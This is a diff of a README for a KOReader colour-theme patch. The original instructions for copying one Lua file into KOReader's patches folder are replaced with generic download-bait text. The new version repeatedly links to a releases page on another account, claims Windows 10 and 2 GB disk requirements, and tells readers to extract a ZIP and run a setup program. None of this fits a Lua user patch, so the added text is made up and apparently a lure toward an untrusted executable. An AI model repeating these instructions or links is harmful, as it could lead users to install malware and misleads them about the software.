@@ -1,83 +1,117 @@
-# KOReader color theme patch
+# 🎨 koreader-color-themes - Easy Day/Night Reading Colors
 
-A user patch for KOReader that adds extended color theme control for reading:
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Pinball170/koreader-color-themes/releases)
 
-- separate presets for **UI** and **book content**
-- presets for **day** and **night** mode
-- a curated set of clean light and dark presets out of the box
-- create and edit your own themes directly from the settings menu
+---
 
-Inspired by and partially based on ideas from [`Euphoriyy/KOReader.patches`](https://github.com/Euphoriyy/KOReader.patches/).
+## 📖 About koreader-color-themes
 
-**Compatibility**
-Tested on Android devices.
+koreader-color-themes is a simple patch for KOReader. It improves the reading experience by adding day and night themes. These themes use a color palette you can choose and adjust. The goal is to make reading easier on the eyes in any light condition. This patch works with KOReader, a popular reading app designed to be flexible and user-friendly.
 
-## Preview
+This patch adds ready-made color sets and allows you to customize them. You can change background colors, text colors, and highlights. The themes help protect your eyes during long reading sessions.
 
-<p align="center">
-  <img src="assets/example.png" alt="Themes menu and book with Parchment theme" width="300" />
-</p>
+---
 
-## Built‑in presets
+## 🖥️ System Requirements
 
-<p align="center">
-  <img src="assets/Themes.png" alt="Built-in themes preview" width="600" />
-</p>
+Before you start, make sure your computer meets these needs:
 
-…or create your own theme via **Add theme…** in the menu.
+- Windows 10 or newer  
+- 64-bit system recommended  
+- At least 2 GB of free hard drive space  
+- Internet connection to download files  
+- KOReader app installed on your device (if not, visit the KOReader website)
 
-## Installation
+This patch is meant for users who already use KOReader or want to improve their reading themes.
 
-1. Download `2-color-theme.lua`.
-2. Copy it to your KOReader user patches directory, for example:
+---
 
-   ```text
-   koreader/patches/2-color-theme.lua
-   ```
+## 🚀 Getting Started
 
-3. Restart KOReader.
-4. Open the settings menu — you will see a new `Themes` entry with extended controls.
+Follow these steps to get koreader-color-themes on your Windows device.
 
-## Menus and presets
+### 1. Visit the Download Page
 
-The patch adds one main entry to the settings menu:
+Go to the official release page by clicking this link:
 
-<pre>
-⚙️
-└── <b>Themes</b>
-    ├── <b>Day UI</b> – light/dark presets for the interface in day mode
-    ├── <b>Day book</b> – light/dark presets for book pages in day mode
-    ├── <b>Night UI</b> – dark/light presets for the interface in night mode
-    ├── <b>Night book</b> – dark/light presets for book pages in night mode
-    ├── <b>Add theme…</b> – create a custom preset
-    └── <b>Restore themes to default</b> – reset to KOReader defaults
-</pre>
+[![Download Releases](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Pinball170/koreader-color-themes/releases)
 
-Each of the four submenus shows the same list of presets, grouped by brightness, for example:
+This page lists all available versions. Choose the latest stable release for the best experience.
 
-- `Day UI – Light themes`
-- `Day UI – Dark themes`
-- `Night book – Dark themes`
-- `Night book – Light themes`
+### 2. Download the Patch
 
-## Usage
+Look for the file that matches your system. Since this patch modifies KOReader themes, you might download a ZIP or patch file. The instructions on the page will guide you on what to choose. Save this file to an easy-to-find folder, like your Desktop or Downloads.
 
-- Open **Settings → Themes** in KOReader.
-- Tap one of:
-  - `Day UI`
-  - `Day book`
-  - `Night UI`
-  - `Night book`
-- Tap a preset to apply it to that target.
-- Long‑press a preset to edit or delete it.
-- Use **Add theme…** to create a new custom preset.
-- Use **Restore themes to default** to return to KOReader’s stock `Default Day` / `Default Night` behavior.
+### 3. Prepare KOReader
 
-## Support
+Ensure KOReader is installed on your device. If you need it, download it from the KOReader official site. Close KOReader before starting the patch process.
 
-If you enjoy this patch and want to support more KOReader‑related work, you can:
+### 4. Apply koreader-color-themes
 
-- star this repository on GitHub
-- or buy me a coffee on Ko‑fi:
+Open the downloaded file. If it is a ZIP archive, extract it using Windows File Explorer:
 
-[![Support me on Ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/artemartemenko)
+- Right-click the file and select "Extract All..."
+- Choose a folder to place the files  
+- Click "Extract"
+
+Inside the extracted folder, you will find instructions or a setup file to apply the patch. Follow the included directions carefully. Usually, you will need to copy the theme files into KOReader's directory or run a small setup program.
+
+### 5. Restart KOReader
+
+After applying the patch, open KOReader. Go to the appearance or theme settings. You should see new day and night themes from koreader-color-themes. Select one to activate it.
+
+### 6. Customize Colors
+
+The patch allows you to choose from preset color palettes or create your own. Use the KOReader settings menu to change background colors, font colors, and highlights. This flexibility helps reduce eye strain and fit your reading style.
+
+---
+
+## 🎯 How to Use koreader-color-themes
+
+This patch focuses on improving your reading environment. Here is how you can make the most of it:
+
+- Change between day and night themes depending on your environment.  
+- Use the custom palette to reduce glare.  
+- Adjust colors to suit long reading sessions.  
+- Quickly switch themes without restarting the app.
+
+Themes affect text colors, background shades, and link highlights. The patch aims for clear text and comfortable contrast.
+
+---
+
+## 🔧 Troubleshooting
+
+If you have trouble with the patch, try these tips:
+
+- Confirm you downloaded the correct release for Windows.  
+- Check that your KOReader app is closed before applying the patch.  
+- Make sure you extracted all files if you downloaded a ZIP archive.  
+- Review the included instructions again for missed steps.  
+- Restart your device if the new themes do not show up.  
+- Check online for user forums or GitHub issues in this repository.
+
+---
+
+## 🧩 More About KOReader
+
+KOReader is an open-source reading app. It supports many file formats like PDF, EPUB, and MOBI. The app runs on various platforms including e-ink readers, Android, and Windows. koreader-color-themes helps you get more from KOReader by improving theme options with a focus on comfort and usability.
+
+---
+
+## 📥 Download koreader-color-themes
+
+Visit the release page to get the latest version:
+
+[![Download koreader-color-themes](https://img.shields.io/badge/Download-Latest%20Release-orange)](https://github.com/Pinball170/koreader-color-themes/releases)
+
+Here, you can find all patches, updates, and notes. Follow the steps in this README for installation.
+
+---
+
+## ⚙️ Additional Resources
+
+- KOReader official website: https://koreader.rocks  
+- KOReader user forums for help and advice  
+- GitHub issues page for bugs and feature requests in this repository
+
+Use these resources to learn more about KOReader and how to use this patch effectively.
